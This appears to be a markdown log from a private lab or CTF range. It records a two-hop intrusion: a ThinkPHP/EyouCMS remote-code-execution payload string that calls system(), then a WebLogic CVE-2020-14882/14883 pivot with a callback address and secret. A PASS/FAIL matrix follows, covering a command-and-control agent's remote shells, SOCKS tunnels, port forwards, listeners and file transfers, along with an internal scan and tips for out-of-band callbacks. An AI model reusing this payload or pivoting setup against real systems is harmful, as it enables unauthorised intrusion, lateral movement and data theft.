## Real-machine lab evidence (2026-07-17)

### Chain
1. **Edge** `10.7.11.116` / `172.16.23.10` — EyouCMS (ThinkPHP) RCE  
   `?s=home/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=…`  
   user `www-data` → agent **node 1** `4b81331d0c38`
2. **Pivot** `172.16.23.20:7001` — WebLogic **12.2.1.3.0**  
   CVE-2020-14882/14883 (console path + ShellSession) → user `oracle` → agent **node 2** `6a86dff1da0b`
3. Callback: `192.168.230.57:19137` secret `ctfsecret`

### Feature matrix (PASS/FAIL)

| Feature | Target | Result |
|---------|--------|--------|
| list_nodes | — | PASS (ids 1,2 sparse-safe) |
| get_node_detail | 1,2 | PASS |
| add_node_memo | 1,2 | PASS |
| start_cmd | 1 | PASS `www-data` / `172.16.23.10` |
| start_cmd | 2 | PASS `oracle` |
| start_socks | 1 → `:11081` | PASS ready; HTTP via SOCKS to 172.16.23.10/20 |
| start_socks | 2 → `:11082` | PASS ready; HTTP to 7001 |
| start_forward | 1 listen `127.0.0.1:18001` → `172.16.23.20:7001` | PASS ready; via SOCKS n1 |
| start_backward | 2 local `127.0.0.1:17001` → `127.0.0.1:7001` | PASS; controller curl 404 WebLogic |
| start_listener | 1 `0.0.0.0:19138` | PASS ready:true |
| upload_file | 1,2 `/tmp/styx-upload-probe.txt` | PASS 18 bytes |
| pull_file | 1 → local | PASS sha256 match content |
| get_task_status | all above | PASS done/ready |

### Internal scan (via SOCKS n1)
- `172.16.23.1:22,80`
- `172.16.23.10:80`
- `172.16.23.20:7001` (WebLogic)

### Notes
- curl to WebLogic often needs HTTP/1.0 or raw sockets (empty reply with some clients).
- Simple `http.server` stage does not accept POST (use GET callbacks for OOB).
